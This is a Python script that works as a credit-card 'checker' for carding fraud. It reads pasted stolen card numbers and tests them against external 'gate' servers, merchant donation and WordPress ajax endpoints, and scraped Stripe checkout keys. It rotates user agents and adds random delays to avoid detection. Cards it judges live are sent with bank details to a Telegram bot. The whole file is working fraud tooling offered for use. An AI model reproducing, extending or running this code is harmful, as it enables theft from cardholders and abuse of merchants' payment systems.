import sys, os, time, random, requests, threading, re, uuid, base64, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from flask import Flask

# --- RENDER SERVER SETUP ---
app = Flask(__name__)
@app.route('/')
def health_check():
    return "Engine V30 Staples Edition is Running"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

init(autoreset=True)

class UltimateMasterV30:
    def __init__(self):
        self.lock = threading.Lock()
        self.is_killed = False
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.current_gate = "Toji"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        self.bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") 
        self.chat_id = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")     
        
        self.pk = None
        self.cs = None
        self.mode = "Standard" 
        
        # --- UPDATED TARGETS (Staples Added) ---
        self.targets = {
            "Amazon": "https://www.amazon.com/gp/your-account/",
            "Telegram Stars": "https://fragment.com/stars",
            "YouTube Premium": "https://www.youtube.com/premium",
            "Staples": "https://www.staples.com", # Added
            "Verifone": "https://verifone.cloud",
            "Dharmatrading": "https://dharmatrading.com",
            "BGMI UC": "https://www.midasbuy.com/midasbuy/ot/shop/bgmi"
        }

    def extract_from_link(self, checkout_url):
        try:
            encoded = quote(checkout_url, safe='')
            api_url = f"https://rylax.pro/bot.js/process?url={encoded}&cc=dummy"
            resp = requests.get(api_url, timeout=20).json()
            if resp.get("success"):
                self.pk = resp["checkout_data"].get("pk_live")
                self.cs = resp["checkout_data"].get("cs_live")
                print(Fore.GREEN + f"[+] Stripe PK Extracted: {self.pk[:15]}...")
            return self.pk is not None
        except: return False

    def get_bin_info(self, cc):
        try:
            bin_num = cc[:6]
            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
            bank = res.get("bank", {}).get("name", "Unknown")
            level = res.get("type", "Unknown").upper()
            return f"{bank} | {level}"
        except: return "Unknown BIN"

    def send_log(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "Markdown"}
            requests.post(url, json=payload, timeout=10)
        except: pass

    def process_card(self, cc):
        if self.is_killed: return
        try:
            time.sleep(random.randint(5, 10))
            cc_clean = cc.replace(' ', '').strip()
            if not cc_clean: return
            
            srv_name = random.choice(list(self.targets.keys()))
            target_url = self.targets[srv_name]
            
            if self.mode == "PayPal":
                final_gate = f"https://binnaclehouse.org/donation/?amount=1&cc={cc_clean}"
            elif self.mode == "Authorize":
                final_gate = f"https://morgannasalchemy.com/wp-admin/admin-ajax.php?cc={cc_clean}"
            elif self.pk and self.cs:
                final_gate = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
            else:
                final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(target_url)}"

            headers = {'User-Agent': self.ua.random, 'X-Requested-With': 'com.android.vending'}
            resp = requests.get(final_gate, headers=headers, timeout=50)
            res_text = resp.text.lower()

            with self.lock:
                if any(x in res_text for x in ["succeeded", "charged", "success", "approved"]):
                    bin_info = self.get_bin_info(cc_clean)
                    msg = (f"🔥 *{self.mode} HIT* 🔥\n\n💳 `{cc_clean}`\n🏦 {bin_info}\n📱 Target: {srv_name}\n✅ Status: LIVE")
                    self.send_log(msg)
                    print(Fore.GREEN + f"[LIVE] {cc_clean} | {srv_name}")
                else:
                    print(Fore.RED + f"[DEC] {cc_clean[:16]}")
        except: pass

    def run(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        print(Fore.RED + "███████╗████████╗██████╗ ██╗██████╗ ███████╗")
        print(Fore.WHITE + "V30 ENGINE | STAPLES & MULTI-GATE READY")
        
        print(Fore.YELLOW + "\n1. Standard | 2. PayPal | 3. Authorize | 4. Stripe Link")
        choice = input("Select Mode: ")
        if choice == "2": self.mode = "PayPal"
        elif choice == "3": self.mode = "Authorize"
        elif choice == "4":
            self.mode = "Stripe"
            link = input("Enter Stripe Link: ").strip()
            self.extract_from_link(link)

        # --- COPY-PASTE SYSTEM ---
        print(Fore.CYAN + "\n[!] Paste cards (CC|MM|YY|CVV) and press Enter twice:")
        cards = []
        while True:
            line = input()
            if not line.strip(): break
            cards.append(line.strip())

        if not cards: return

        print(Fore.MAGENTA + f"[*] Checking {len(cards)} cards...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(self.process_card, cards)

if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    UltimateMasterV30().run()
